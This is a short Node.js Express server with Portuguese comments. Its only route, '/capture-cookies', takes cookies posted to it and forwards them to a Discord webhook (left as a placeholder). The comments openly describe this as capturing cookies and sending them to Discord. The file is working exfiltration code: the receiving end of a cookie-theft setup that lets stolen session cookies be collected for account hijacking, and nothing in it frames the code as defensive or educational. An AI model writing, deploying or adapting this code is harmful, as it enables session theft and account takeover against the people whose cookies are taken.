const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const port = 3000;

// Middleware para analisar corpos de solicitação
app.use(bodyParser.json());

// Rota para capturar os cookies e enviar para o Discord
app.post('/capture-cookies', (req, res) => {
    const { cookies } = req.body;

    // Enviar os cookies para o Discord webhook
    fetch('https://discord.com/api/webhooks/SEU_WEBHOOK', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: cookies }),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Erro ao enviar cookies para o Discord');
        }
        console.log('Cookies enviados com sucesso para o Discord!');
        res.sendStatus(200);
    })
    .catch(error => {
        console.error('Erro:', error);
        res.status(500).send('Erro ao enviar cookies para o Discord');
    });
});

// Iniciar o servidor
app.listen(port, () => {
    console.log(`Servidor escutando na porta ${port}`);
});
